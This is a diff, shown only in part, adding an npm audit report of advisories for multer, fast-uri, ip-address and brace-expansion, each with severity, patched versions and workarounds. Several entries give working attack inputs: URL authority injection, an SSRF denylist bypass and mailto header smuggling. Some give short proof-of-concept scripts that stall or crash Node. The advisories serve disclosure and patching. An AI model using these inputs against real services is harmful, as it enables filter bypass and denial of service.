@@ -1,0 +1,1322 @@
+{
+  "actions": [],
+  "advisories": {
+    "1239935": {
+      "findings": [
+        {
+          "version": "2.3.0",
+          "paths": [
+            "artifacts__api-server>multer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-3pph-fpjx-jg34\n- https://nvd.nist.gov/vuln/detail/CVE-2026-88932\n- https://github.com/expressjs/multer/commit/53337f9713619ef3381ee6b4e541f926dbaac305\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.4.0\n- https://github.com/advisories/GHSA-3pph-fpjx-jg34",
+      "created": "2026-09-28T21:34:58.000Z",
+      "id": 1239935,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMulter's `diskStorage` can leave complete, orphaned files on disk when a multipart upload is aborted in the brief window before the storage engine assigns the file path. This is an incomplete fix of CVE-2026-5038: the earlier cleanup removes only in-flight uploads that already have a path, so an upload aborted inside that window is written to disk with nothing left to remove it, and the application is not given a handle to clean it up. An unauthenticated attacker sending aborted requests to any route backed by disk storage can accumulate orphaned files until the upload directory or the shared system temporary directory is exhausted. An asynchronous `destination` or `filename` widens the window.\n\n### Patches\n\nUsers should upgrade to `2.4.0` or higher.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via orphaned disk writes on aborted uploads",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-88932"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "multer",
+      "vulnerable_versions": ">=2.2.0 <2.4.0",
+      "github_advisory_id": "GHSA-3pph-fpjx-jg34",
+      "recommendation": "Upgrade to version 2.4.0 or later",
+      "patched_versions": ">=2.4.0",
+      "updated": "2026-09-28T21:34:59.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-3pph-fpjx-jg34"
+    },
+    "1239942": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-qw65-cvwx-89v3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84292\n- https://github.com/fastify/fast-uri/commit/820e8478dd7da3d09f187bfaf35d50b71f67b8b4\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.6\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.7\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.4\n- https://github.com/advisories/GHSA-qw65-cvwx-89v3",
+      "created": "2026-09-28T21:24:39.000Z",
+      "id": 1239942,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` serializes the `port` component of a URI without validating it. When recomposing the authority, `fast-uri` escapes the userinfo and host components but concatenates the port verbatim, so a `port` value that is not a sequence of digits can inject authority delimiters. For example, serializing a component whose `port` is `@127.0.0.1:8124` produces `http://trusted.example:@127.0.0.1:8124/app`, demoting the intended host to userinfo and pointing the authority at an attacker-controlled host. Both `fast-uri` and Node's `URL` read the result back as the attacker's host with no error, so re-validating the built URI does not catch it.\n\nThis affects applications that build URIs from parts and assign untrusted data to the `port` component (for example a fixed host from configuration and a port taken from user input or a service record). The same path is reachable through `serialize()`, `normalize()`, and `equal()` in their object forms. A `port` obtained from `parse()` is always digits and is not affected.\n\n### Patches\n\nThis vulnerability has been patched in fast-uri `4.1.4`, `3.1.7`, and `2.4.6`. `recomposeAuthority` now rejects any port that is not `*DIGIT` per RFC 3986. All users should upgrade.\n\n### Workarounds\n\nIf upgrading is not immediately possible, validate the `port` value against the RFC 3986 grammar (digits only) before passing a component to `serialize()`, `normalize()`, or `equal()`, and reject anything else, for example `if (!/^\\d*$/.test(String(port))) throw new Error('invalid port')`.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to authority injection via an unvalidated port in serialize",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84292"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.0 <4.1.4",
+      "github_advisory_id": "GHSA-qw65-cvwx-89v3",
+      "recommendation": "Upgrade to version 4.1.4 or later",
+      "patched_versions": ">=4.1.4",
+      "updated": "2026-09-28T21:24:40.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-qw65-cvwx-89v3"
+    },
+    "1239945": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-58mr-gqgx-xq4g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84394\n- https://github.com/fastify/fast-uri/pull/214\n- https://github.com/fastify/fast-uri/commit/e00815236bc94107e44ef1b2f5318a06bac225c0\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.6\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.7\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.4\n- https://github.com/advisories/GHSA-58mr-gqgx-xq4g",
+      "created": "2026-09-28T21:23:35.000Z",
+      "id": 1239945,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` accepts a host that contains an unbalanced or misplaced authority bracket (`[` or `]`) without reporting an error. A host that starts with `[` but does not end with `]`, such as `[@127.0.0.1`, is neither validated as an IP literal nor canonicalized as a domain name, so `parse()` returns it as the host with `error` undefined, while Node's `URL` (and `http.get`, `axios`, `got`, and other clients built on it) resolve the same string to `127.0.0.1`. An application that reads `parse().host` to make a host decision (an SSRF denylist, a redirect allowlist, or proxy routing) and then passes the original URL to an HTTP client evaluates its policy against a string that is not the host the request reaches. The same host is carried through `normalize()`, `equal()`, and `resolve()`.\n\n### Patches\n\nThis vulnerability has been patched in fast-uri `4.1.4`, `3.1.7`, and `2.4.6`. `parse()` now reports `URI host is malformed.` for any host that contains a bracket but is not a valid `[IPv6]` literal. All users should upgrade.\n\n### Workarounds\n\nIf upgrading is not immediately possible, reject any URL whose host contains a `[` or `]` that is not a well-formed IPv6 literal before making a host decision. Clients that fail closed on credential-bearing URLs, such as Node's global `fetch()`, are not affected by the reported vector.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via an unclosed bracket in the URI authority",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84394"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fast-uri",
+      "vulnerable_versions": "=4.1.3",
+      "github_advisory_id": "GHSA-58mr-gqgx-xq4g",
+      "recommendation": "Upgrade to version 4.1.4 or later",
+      "patched_versions": ">=4.1.4",
+      "updated": "2026-09-28T21:23:36.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-58mr-gqgx-xq4g"
+    },
+    "1240090": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-hrr3-gc8f-f4qj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-86472\n- https://github.com/fastify/fast-uri/commit/5dabb86732aa2a7655e258719970e61e12b6b4d1\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.7\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.8\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.5\n- https://github.com/advisories/GHSA-hrr3-gc8f-f4qj",
+      "created": "2026-09-29T23:54:25.000Z",
+      "id": 1240090,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` folds the host to lowercase before it percent-decodes the host, so a percent-encoded uppercase unreserved octet such as `%41` decodes to a literal `A` that is never folded. For a scheme-relative reference (`//host`) there is no scheme, so the host canonicalization that repairs this on a scheme-bearing URL does not run. As a result `parse`, `normalize`, and `equal` disagree on the same host: `parse(\"//%41.com\").host` returns `\"A.com\"` while `parse(\"//a.com\").host` and `parse(\"//A.com\").host` return `\"a.com\"`, and `equal(\"//%41.com\", \"//a.com\")` is `false` even though `equal(\"//A.com\", \"//a.com\")` is `true`. An application that makes a case-sensitive host decision on `fast-uri` output for a scheme-relative reference, for example a host allowlist or denylist that compares `parse(url).host` or uses `fast-uri.equal`, can be steered past the check with a percent-encoded uppercase octet. Because a hostname is case-insensitive in DNS and HTTP routing, the evading spelling reaches the same host the check meant to gate, so the effect is check evasion rather than reaching a different registrable host.\n\n### Patches\n\nUpgrade to `fast-uri` 4.1.5, 3.1.8, or 2.4.7.\n\n### Workarounds\n\nCompare hosts case-insensitively (lowercase the parsed host before any allowlist or denylist decision), or avoid making case-sensitive host decisions on scheme-relative input until upgrading.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to inconsistent host case normalization via percent-encoded octets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-86472"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.0 <4.1.5",
+      "github_advisory_id": "GHSA-hrr3-gc8f-f4qj",
+      "recommendation": "Upgrade to version 4.1.5 or later",
+      "patched_versions": ">=4.1.5",
+      "updated": "2026-09-29T23:54:26.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-178"
+      ],
+      "url": "https://github.com/advisories/GHSA-hrr3-gc8f-f4qj"
+    },
+    "1240093": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-jvvf-x445-j334\n- https://nvd.nist.gov/vuln/detail/CVE-2026-86818\n- https://github.com/fastify/fast-uri/commit/f40a88f33e684a46faec3f5b820bcbb1e85add64\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.5\n- https://github.com/advisories/GHSA-jvvf-x445-j334",
+      "created": "2026-09-29T23:51:16.000Z",
+      "id": 1240093,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `mailto` scheme parser compares each query field name to the reserved names (`to`, `subject`, `body`) while the name is still percent-encoded, and only percent-decodes it when storing it as a generic header. On serialize, the decoded name is re-emitted, so a field name such as `%74o` (percent-encoded `to`) is not recognized as a recipient at parse time (`parse().to` shows only the legitimate recipient) but materializes as a literal `to=` field after `serialize()`, and reparsing then treats it as a recipient. The same technique smuggles `subject` and `body` through `%73ubject` and `%62ody`.\n\nAn application that parses an untrusted mailto URI, makes a display, allowlist, or logging decision on `parse().to`, then re-serializes the result and passes the serialized string to a mail client or an outbound send path can gain an attacker-chosen recipient, subject, or body that was not visible when the recipient list was checked. A scanner inspecting the raw input for an extra `to=` sees nothing, because the injected field appears only after `fast-uri` serializes.\n\n### Patches\n\nUpgrade to `fast-uri` 4.1.5.\n\n### Workarounds\n\nPercent-decode and compare mailto field names case-insensitively before trusting `parse().to`, or re-check the recipient list on the serialized output rather than only on the initial parse, until upgrading.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to mailto header injection via percent-encoded field-name desynchronization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-86818"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.1.3 <4.1.5",
+      "github_advisory_id": "GHSA-jvvf-x445-j334",
+      "recommendation": "Upgrade to version 4.1.5 or later",
+      "patched_versions": ">=4.1.5",
+      "updated": "2026-09-29T23:51:17.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-172",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-jvvf-x445-j334"
+    },
+    "1240097": {
+      "findings": [
+        {
+          "version": "10.7.0",
+          "paths": [
+            "artifacts__api-server>express-rate-limit>ip-address"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/beaugunderson/ip-address/security/advisories/GHSA-j6r3-76f7-8jcv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-101912\n- https://github.com/beaugunderson/ip-address/commit/1343629d57fea413644a5c9d41ff1e59619f3f28\n- https://github.com/beaugunderson/ip-address/releases/tag/v10.7.1\n- https://github.com/advisories/GHSA-j6r3-76f7-8jcv",
+      "created": "2026-09-29T23:46:52.000Z",
+      "id": 1240097,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`isInSubnet()` and `isHostInSubnet()` accept an address of either family and compare masked binary strings without checking that both operands are the same family. `Address4` pads to 32 bits and `Address6` to 128, so whenever the leading bits agree the strings are equal: `new Address6('a00::1').isInSubnet(new Address4('10.0.0.0/8'))` is `true`, and `new Address4('32.0.0.1').isInSubnet(new Address6('2000::/3'))` is `true`. No IPv4 address is inside an IPv6 network, so both answers are untrue.\n\nAn application that parses untrusted input as whichever family accepts it and then tests the result against a fixed-family allowlist can admit an address outside the list.\n\n### Details\n\nBoth methods are in `src/common.ts`:\n\n```ts\nexport function isInSubnet(this: Address4 | Address6, address: Address4 | Address6) {\n  if (this.subnetMask < address.subnetMask) {\n    return false;\n  }\n\n  return isHostInSubnet.call(this, address);\n}\n\nexport function isHostInSubnet(this: Address4 | Address6, address: Address4 | Address6) {\n  return this.mask(address.subnetMask) === address.mask();\n}\n```\n\n`mask(n)` returns the first `n` bits of the address as a string of `0` and `1`, taken from a representation padded to the family's width. `new Address6('a00::1').mask(8)` is `'00001010'`, and so is `new Address4('10.0.0.0/8').mask()`, so string equality reports containment. The signature admits either family on either side, so TypeScript raises nothing, and the `v4` property on `Address6` marks IPv4 notation (`::ffff:10.0.0.1`) rather than family, so it does not discriminate either.\n\nWhich cross-family pairs coincide depends on the network's prefix length. `mask(n)` on an `Address4` returns at most 32 bits, so an IPv6 network longer than `/32` never matches an IPv4 address, and an IPv6 network of `/32` or shorter matches exactly the IPv4 addresses whose leading bits equal its prefix. An IPv4 network is at most 32 bits and matches every IPv6 address whose leading bits equal its prefix.\n\n### Affected versions\n\n`<= 10.7.0`. The comparison has had this shape since the methods were written, so every release is affected.\n\n### Impact\n\n| Expression | Result | Reason |\n|---|---|---|\n| `new Address6('a00::1').isInSubnet(new Address4('10.0.0.0/8'))` | `true` | both mask to `00001010` |\n| `new Address4('10.0.0.1').isInSubnet(new Address6('a00::/8'))` | `true` | the same bits, reversed |\n| `new Address4('32.0.0.1').isInSubnet(new Address6('2000::/3'))` | `true` | both begin `001` |\n| `new Address4('32.1.13.184').isInSubnet(new Address6('2001:db8::/32'))` | `true` | the `/32` spells an IPv4 address |\n| `new Address6('cb00:7100::1').isInSubnet(new Address4('203.0.113.0/24'))` | `true` | the `/24` spells an IPv6 prefix |\n| `new Address4('10.0.0.1').isInSubnet(new Address6('::ffff:10.0.0.0/104'))` | `false` | `/104` is longer than 32 bits |\n| `new Address4('8.8.8.8').isInSubnet(new Address4('10.0.0.0/8'))` | `false` | same-family control |\n\nIn the allowlist direction the check admits an address outside the list; in the denylist direction it blocks an address outside the list. What the coincidence can admit is narrow. An IPv6 allowlist of `/32` or shorter admits the IPv4 addresses its prefix spells: `2001:db8::/32` admits exactly `32.1.13.184`, and `2000::/3` admits `32.0.0.0/3`. Those are public IPv4 addresses; the private, loopback, and link-local ranges begin with bit patterns no allocated IPv6 prefix shares. An IPv4 allowlist admits the IPv6 addresses its prefix spells, and those all sit in blocks IANA has not allocated. So a request admitted through this defect reaches an address outside the intended list, not an internal host, and the severity reflects that.\n\n### Proof of concept\n\n`npm i ip-address@10.7.0`, then:\n\n```js\nconst { Address4, Address6 } = require('ip-address');\n\n// An allowlist of the application's own IPv6 range, tested against whichever\n// family the input parses as.\nconst allowed = new Address6('2001:db8::/32');\n\nfunction parse(host) {\n  return Address4.isValid(host) ? new Address4(host) : new Address6(host);\n}\n\nfor (const h of ['2001:db8::1', '2001:db9::1', '32.1.13.184', '32.1.13.185']) {\n  console.log(parse(h).isInSubnet(allowed) ? 'ALLOW' : 'BLOCK', h);\n}\n```\n\nOn affected versions:\n\n```\nALLOW 2001:db8::1\nBLOCK 2001:db9::1\nALLOW 32.1.13.184\nBLOCK 32.1.13.185\n```\n\nThe IPv6 rows are right. The IPv4 address whose 32 bits equal the allowlist's prefix is admitted; the one next to it is not.\n\n### Remediation\n\nUpgrade to the patched release. In the fix, `isHostInSubnet()` returns `false` when the two addresses are of different families, and `isInSubnet()` inherits the answer. The methods keep accepting either family so existing call sites compile. A caller that means to compare across families converts first, with `Address6.fromAddress4()`, `to4()`, or `toAddress4Nat64()`: `new Address6('::ffff:10.0.0.1').to4().isInSubnet(new Address4('10.0.0.0/8'))` is `true`, as before.\n\nIf you cannot upgrade immediately, compare the classes before you compare the addresses:\n\n```js\nconst contained = host.constructor === network.constructor && host.isInSubnet(network);\n```\n\n### A note on SSRF defense\n\nThese methods are address classifiers, not a complete SSRF defense. Regardless of this fix, a robust SSRF guard must resolve the hostname and validate the *resolved* IP against the socket it connects to, and account for DNS rebinding and redirects. Treat these checks as one layer, not the only one.",
+      "reported_by": null,
+      "title": "ip-address: isInSubnet() and isHostInSubnet() compare addresses of different families as if they shared an address space, allowing an allowlist check to admit an address outside its range",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-101912"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ip-address",
+      "vulnerable_versions": "<=10.7.0",
+      "github_advisory_id": "GHSA-j6r3-76f7-8jcv",
+      "recommendation": "Upgrade to version 10.7.1 or later",
+      "patched_versions": ">=10.7.1",
+      "updated": "2026-09-29T23:46:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-697",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-j6r3-76f7-8jcv"
+    },
+    "1240098": {
+      "findings": [
+        {
+          "version": "10.7.0",
+          "paths": [
+            "artifacts__api-server>express-rate-limit>ip-address"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/beaugunderson/ip-address/security/advisories/GHSA-h3mg-xc3c-68pw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-101911\n- https://github.com/beaugunderson/ip-address/commit/469ead1231b4cc059f2150c626e1e0c2895c0134\n- https://github.com/beaugunderson/ip-address/commit/8b34a21e0839b37c094066816fb2c2c48a2adcf5\n- https://github.com/beaugunderson/ip-address/releases/tag/v10.7.1\n- https://github.com/advisories/GHSA-h3mg-xc3c-68pw",
+      "created": "2026-09-29T23:46:39.000Z",
+      "id": 1240098,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`new Address6()` and `Address6.isValid()` place no bound on the length of the string they parse. When the string contains a character that cannot appear in an IPv6 address, the parser builds a diagnostic that wraps every such character in a 34-byte `<span class=\"parse-error\">`, so the work and the memory scale with the input rather than with an address. A 1 MiB string of `!` costs about 110 MB and 70 ms of synchronous work, 8 MiB costs about 800 MB and half a second, 16 MiB throws a `RangeError` in place of the documented `AddressError`, and 32 MiB aborts the Node process. `isValid()` builds the diagnostic and discards it, so a caller that only asks whether a string is valid pays the full price.\n\nAn application that validates an attacker-supplied string with these methods can be stalled or crashed by a single oversized request. This is a crash on input that should have been rejected cleanly, which SECURITY.md lists as in scope.\n\n### Details\n\n`parse()` in `src/ipv6.ts` checks for characters outside `[0-9a-f:/%]` and, on finding any, throws an `AddressError` whose `parseMessage` is the whole input with each offending character wrapped:\n\n```ts\nconst badCharacters = address.match(constants6.RE_BAD_CHARACTERS);\n\nif (badCharacters) {\n  throw new AddressError(\n    `Bad character${badCharacters.length > 1 ? 's' : ''} detected in address: ${badCharacters.join('')}`,\n    address.replace(constants6.RE_BAD_CHARACTERS, '<span class=\"parse-error\">$1</span>'),\n  );\n}\n```\n\n`RE_BAD_CHARACTERS` is `/([^0-9a-f:/%])/gi`. For an input made entirely of punctuation the `match` allocates one string per character, the `join` copies them all into the message, and the `replace` produces a string 34 times the input. Nothing before this point looks at the length: the constructor strips a CIDR suffix and a zone identifier and hands the rest to `parse()`. The `RE_BAD_ADDRESS` branch below it builds its diagnostic the same way at about a third of the ratio, for input in the hex-and-colon alphabet such as `fffff:` repeated.\n\n`parse()` is reached only through the constructor, so every entry point that constructs an `Address6` from a string it has not already bounded is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, `fromWildcard()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromURL()` admits only hex, colons, and dots in a host, so it reaches the `RE_BAD_ADDRESS` branch and not the other. `fromArpa()` caps its input at 32 nibbles before constructing anything, and `fromBigInt()`, `fromByteArray()`, and `fromAddress4()` build the string themselves, so those are unaffected.\n\nThe `replace` is where size becomes fatal. V8 caps a string at 2^29 - 24 characters, so past 16 MiB of input the `replace` throws `RangeError: Invalid string length` rather than the `AddressError` callers catch; `isValid()` swallows it, but a constructor call guarded by `instanceof AddressError` does not. Past 32 MiB the replacement builder's internal array exceeds its maximum size and V8 aborts the process with `Fatal JavaScript invalid size error`, which no `try`/`catch` intercepts.\n\n### Affected versions\n\n`<= 10.7.0`. The diagnostic has had this shape since the parser was written, so every release is affected.\n\n### Impact\n\n`Address6.isValid()` on N bytes of `!`, measured on node 24.19.0:\n\n| Input | Wall time | Transient heap | Outcome |\n|---|---|---|---|\n| 16 KiB | 1 ms | 1 MB | `false` |\n| 1 MiB | 73 ms | 112 MB | `false` |\n| 8 MiB | 464 ms | 784 MB | `false` |\n| 16 MiB | | | `RangeError: Invalid string length` from the constructor; `isValid()` returns `false` |\n| 32 MiB | | | the process aborts |\n\nThe parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. The heap is transient and is reclaimed after the call returns, so memory does not accumulate across requests; the abort at 32 MiB is a single request. `Address4` has no diagnostic of this shape and parses the same 8 MiB in a few milliseconds.\n\n### Reachability\n\nReaching the sizes above requires that the application hand the parser a string it has not already bounded. A host taken from a URL or an HTTP header is bounded by the server's header limit (Node's default is 16 KB), and at that size the cost is a millisecond. The megabyte sizes need a request body the application accepts at that scale and passes through unchecked. Common body parsers default to between 100 KB and 1 MB, which caps the effect at a stall of under 100 ms per request, and the abort needs 32 MiB in a single field, which no default admits. The severity is scored for the stall, not the abort: an application that accepts 32 MiB bodies into an address parser is the exception, and the reader running one should treat this as a crash.\n\n### Proof of concept\n\n`npm i ip-address@10.7.0`, then:\n\n```js\nconst { Address6 } = require('ip-address');\n\nfor (const mib of [1, 8]) {\n  const input = '!'.repeat(mib * 1024 * 1024);\n  const before = process.memoryUsage().heapUsed;\n  const start = process.hrtime.bigint();\n\n  Address6.isValid(input);\n\n  const ms = Number(process.hrtime.bigint() - start) / 1e6;\n  const mb = (process.memoryUsage().heapUsed - before) / 1048576;\n\n  console.log(`${mib} MiB: ${ms.toFixed(0)} ms, ${mb.toFixed(0)} MB`);\n}\n\ntry {\n  new Address6('!'.repeat(16 * 1024 * 1024));\n} catch (e) {\n  console.log(`16 MiB: ${e.name}: ${e.message}`);\n}\n\nnew Address6('!'.repeat(32 * 1024 * 1024));\n```\n\nOn affected versions (node 24.19.0):\n\n```\n1 MiB: 73 ms, 112 MB\n8 MiB: 464 ms, 784 MB\n16 MiB: RangeError: Invalid string length\n\n\n#\n# Fatal error in , line 0\n# Fatal JavaScript invalid size error 142606336\n#\n```\n\nThe last line is V8 terminating the process; the script does not reach its end.\n\n### Remediation\n\nUpgrade to the patched release. In the fix, the constructor rejects an address longer than the family allows before `parse()` runs: 45 characters for IPv6 once the CIDR suffix and zone identifier are stripped (six four-digit groups, six colons, and a dotted quad, the same line CPython's `ipaddress` module draws), and 15 characters for IPv4. The rejection is an `AddressError` with no `parseMessage`, so `isValid()` returns `false` for the cost of a length comparison and the 32 MiB input above is rejected in the same time as a 46-character one. A zone identifier is not counted, since it never reaches the diagnostic.\n\nThis rejects nothing a previous release accepted: every string longer than the limit already failed to parse.\n\nIf you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:\n\n```js\nif (host.length > 64) throw new Error('not an IP address');\n```",
+      "reported_by": null,
+      "title": "ip-address: Address6 builds a parse diagnostic proportional to the input with no length bound, allowing a single long string to stall or crash the process",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-101911"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ip-address",
+      "vulnerable_versions": "<=10.7.0",
+      "github_advisory_id": "GHSA-h3mg-xc3c-68pw",
+      "recommendation": "Upgrade to version 10.7.1 or later",
+      "patched_versions": ">=10.7.1",
+      "updated": "2026-09-29T23:46:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-h3mg-xc3c-68pw"
+    },
+    "1240103": {
+      "findings": [
+        {
+          "version": "5.0.9",
+          "paths": [
+            "lib__api-spec>orval>typedoc>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-q2hr-2g5m-vwhr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102277\n- https://github.com/juliangruber/brace-expansion/commit/33a5ef17b8d800bbfa8c52b14c39043b6aac1a96\n- https://github.com/juliangruber/brace-expansion/commit/bdff773f98e5988616b7039cc9b508df5d640b22\n- https://github.com/juliangruber/brace-expansion/commit/c55e67d8d8b1c56a2474afff15c2891166b2d364\n- https://github.com/juliangruber/brace-expansion/commit/ffdfa3e3806bed17c0874b8f1439b084de354a7e\n- https://github.com/advisories/GHSA-q2hr-2g5m-vwhr",
+      "created": "2026-09-29T23:45:39.000Z",
+      "id": 1240103,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nExpanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\nBash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\n### Reproduction\n\n```js\nconst build = n => '{a}' + '}'.repeat(n) + ',z}'\n\nfor (const n of [8000, 16000, 32000, 64000, 128000]) {\n  const t = Date.now()\n  expand(build(n))\n  console.log(n, Date.now() - t + 'ms')\n}\n```\n\n| n | input | time | results |\n|---|---|---|---|\n| 8,000 | 8 KB | 110 ms | 2 |\n| 16,000 | 16 KB | 446 ms | 2 |\n| 32,000 | 32 KB | 1.7 s | 2 |\n| 64,000 | 64 KB | 6.9 s | 2 |\n| 128,000 | 128 KB | **27.7 s** | 2 |\n\n`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\n### Mechanism\n\nInstrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\nThere is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\n| n | input length | final string length |\n|---|---|---|\n| 1,000 | 1,006 | 26,006 |\n| 8,000 | 8,006 | 208,006 |\n\nSo the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\n### Why `max` and `maxLength` do not help\n\nThe cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\n### Impact\n\nAn application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\nDegraded availability rather than a crash - the process recovers once the expansion completes.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\n### Patch\n\nThe rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\nNote this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\n### Severity note\n\nScored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.",
+      "reported_by": null,
